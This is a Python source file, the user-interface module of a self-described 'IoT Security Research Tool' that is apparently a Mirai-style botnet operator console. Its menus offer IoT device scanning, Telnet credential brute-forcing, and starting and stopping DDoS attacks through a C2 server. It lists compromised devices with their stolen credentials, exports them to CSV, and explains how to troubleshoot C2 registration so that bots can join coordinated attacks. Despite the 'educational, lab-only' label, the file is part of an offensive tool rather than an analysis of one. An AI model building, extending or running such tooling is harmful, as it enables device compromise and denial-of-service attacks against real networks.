#!/usr/bin/env python3
"""
IoT Security Research - User Interface Module
Educational Purpose Only - For Controlled Lab Environment
"""

import os
import json
import logging
from datetime import datetime


class UserInterface:
    """Handles user interface and display functions"""
    
    def __init__(self, logger=None):
        self.logger = logger or logging.getLogger(__name__)
    
    def log(self, message):
        """Log message with timestamp"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.logger.info(f"[UI] {message}")
        print(f"[{timestamp}] {message}")
    
    def clear_screen(self):
        """Clear the terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        """Print application banner"""
        print("\n" + "="*80)
        print("╔══════════════════════════════════════════════════════════════════════════════╗")
        print("║                          IoT Security Research Tool                          ║")
        print("║                     Educational Purpose Only - Lab Use                       ║")
        print("╚══════════════════════════════════════════════════════════════════════════════╝")
        print("="*80)
    
    def print_menu(self):
        """Print main menu options"""
        print("\n📋 Main Menu:")
        print("1. 🔍 Scan network for IoT devices")
        print("2. 🔓 Brute-force Telnet credentials")
        print("3. 🚀 Start DDoS attack via C2")
        print("4. 🛑 Stop DDoS attack via C2")
        print("5. 📊 Print current status")
        print("6. 💾 Save results to file")
        print("7. 🔄 Fetch data from C2 server")
        print("8. 🔧 Advanced Options")
        print("9. 🚪 Exit")
    
    def print_status(self, scan_results, compromised_devices, c2_connected=None):
        """Print current status with improved formatting"""
        print("\n" + "="*60)
        print("╔═══════════════════════════════════════════════════════╗")
        print("║              IoT Exploiter Status                     ║")
        print("╚═══════════════════════════════════════════════════════╝")

        # Print scan results summary
        print("\n[Scan Results]")
        if not scan_results:
            print("No scan results available")
        else:
            print(f"Found {len(scan_results)} potential targets:")
            
            # Group by service type
            services = {}
            for device in scan_results:
                service = device['service'].lower()
                if service not in services:
                    services[service] = []
                services[service].append(device)
            
            # Print summary by service
            for service, devices in services.items():
                print(f"  {service.upper()} ({len(devices)})")
                for device in devices[:5]:  # Only show first 5 of each type
                    print(f"    - {device['ip']}:{device['port']}")
                if len(devices) > 5:
                    print(f"    ... and {len(devices) - 5} more")

        # Print compromised devices with more details
        print("\n[Compromised Devices]")
        if not compromised_devices:
            print("No compromised devices available")
        else:
            # Sort devices by IP for consistent display
            sorted_devices = sorted(compromised_devices, key=lambda x: x['ip'])
            print(f"Successfully compromised {len(sorted_devices)} devices:")
            
            for i, device in enumerate(sorted_devices, 1):
                # Get status indicator
                if device.get('status') == 'online':
                    status_indicator = "✅ ONLINE"
                elif device.get('status') == 'offline':
                    status_indicator = "❌ OFFLINE"
                else:
                    status_indicator = "❓ UNKNOWN"
                    
                # Get C2 registration status
                if device.get('registered_c2'):
                    c2_status = "✅ Registered with C2: True"
                else:
                    c2_status = "❌ Registered with C2: False"
                
                # Print device info
                print(f"  Device #{i}: {device['ip']} - {status_indicator}")
                print(f"    Credentials: {device['username']}:{device['password']}")
                print(f"    C2 Status: {c2_status}")
                
                # Print additional info if available
                if 'device_type' in device and device['device_type'] != 'unknown':
                    print(f"    Type: {device['device_type']}")
                    
                if 'error' in device:
                    print(f"    Error: {device['error']}")
                    
                print()  # Empty line between devices

        # Print connectivity status
        if c2_connected is not None:
            print("\n[C2 Server Status]")
            if c2_connected:
                print("✅ Connected to C2 server")
            else:
                print("❌ Cannot connect to C2 server")

        print("="*60)
    
    def print_advanced_menu(self):
        """Print advanced options menu"""
        print("\n🔧 Advanced Options:")
        print("1. Change C2 server address")
        print("2. View credentials list")
        print("3. Test device connectivity")
        print("4. Export compromised devices as CSV")
        print("5. Explain 'Not registered with C2' status")
        print("6. Verify and fix C2 registration status")
        print("7. Back to main menu")
    
    def explain_registration_status(self):
        """Explain what 'Not registered with C2' means and how to resolve it"""
        print("\n" + "="*80)
        print("╔═══════════════════════════════════════════════════════════════════════════════╗")
        print("║                      C2 REGISTRATION STATUS EXPLANATION                       ║")
        print("╚═══════════════════════════════════════════════════════════════════════════════╝")
        print()
        print("📋 WHAT DOES 'NOT REGISTERED WITH C2' MEAN?")
        print("   This status indicates that a device was successfully compromised with valid")
        print("   credentials, but the registration with the Command & Control (C2) server failed.")
        print()
        print("🔍 COMMON CAUSES:")
        print("   1. C2 Server Not Running:")
        print("      - The C2 server may not be active or reachable")
        print("      - Check if the server is running on the configured port")
        print()
        print("   2. Network Connectivity Issues:")
        print("      - Firewall blocking communication to C2 server")
        print("      - Network routing problems")
        print("      - Wrong C2 server IP address configured")
        print()
        print("   3. Database Issues:")
        print("      - C2 server database may be locked or corrupted")
        print("      - Insufficient disk space for database operations")
        print()
        print("   4. Server Overload:")
        print("      - C2 server may be overwhelmed with requests")
        print("      - Timeout during registration process")
        print()
        print("🛠️  HOW TO RESOLVE:")
        print("   1. Verify C2 Server Status:")
        print("      - Ensure C2 server is running: python run_c2.py")
        print("      - Check server logs for errors")
        print()
        print("   2. Test Network Connectivity:")
        print("      - Ping the C2 server IP address")
        print("      - Try accessing the web interface: http://<C2_IP>:5000")
        print()
        print("   3. Check Configuration:")
        print("      - Verify C2 server IP in exploit script settings")
        print("      - Ensure port 5000 is not blocked by firewall")
        print()
        print("   4. Retry Registration:")
        print("      - Use the 'Advanced Options' -> 'Test device connectivity'")
        print("      - Restart the C2 server if needed")
        print("      - Re-run the brute-force attack to re-register devices")
        print()
        print("✅ SUCCESSFUL REGISTRATION INDICATORS:")
        print("   - Device status shows 'Registered with C2: True'")
        print("   - Device appears in C2 web interface")
        print("   - Device can be used for DDoS attacks via C2")
        print()
        print("⚠️  IMPACT OF UNREGISTERED DEVICES:")
        print("   - Cannot participate in coordinated DDoS attacks")
        print("   - Not visible in C2 web dashboard")
        print("   - Cannot receive commands from C2 server")
        print("   - Still compromised with valid credentials (can be manually accessed)")
        print("="*80)
    
    def save_results(self, scan_results, compromised_devices, prefix="results"):
        """Save scan and exploitation results with custom prefix"""
        try:
            # Create results directory if it doesn't exist
            os.makedirs('results', exist_ok=True)
            
            # Add timestamp to filenames
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            # Save scan results
            scan_file = f"results/{prefix}_scan_{timestamp}.json"
            with open(scan_file, 'w') as f:
                json.dump(scan_results, f, indent=4)
            
            # Save compromised devices
            devices_file = f"results/{prefix}_devices_{timestamp}.json"
            with open(devices_file, 'w') as f:
                json.dump(compromised_devices, f, indent=4)
            
            self.log(f"Results saved to {scan_file} and {devices_file}")
            
            # Also save a CSV of compromised devices for easy importing
            csv_file = f"results/{prefix}_devices_{timestamp}.csv"
            with open(csv_file, 'w') as f:
                f.write("IP,Username,Password,Status,RegisteredWithC2\n")
                for device in compromised_devices:
                    f.write(f"{device['ip']},{device['username']},{device['password']},{device.get('status', 'unknown')},{device.get('registered_c2', False)}\n")
            
            self.log(f"CSV export saved to {csv_file}")
            
            return True
            
        except Exception as e:
            self.log(f"Error saving results: {e}")
            return False
    
    def get_user_input(self, prompt, valid_choices=None):
        """Get user input with validation"""
        while True:
            try:
                user_input = input(prompt).strip()
                
                if valid_choices and user_input not in valid_choices:
                    print(f"Invalid choice. Please select from: {valid_choices}")
                    continue
                    
                return user_input
                
            except KeyboardInterrupt:
                print("\nExiting...")
                return None
            except Exception as e:
                print(f"Input error: {e}")
                continue
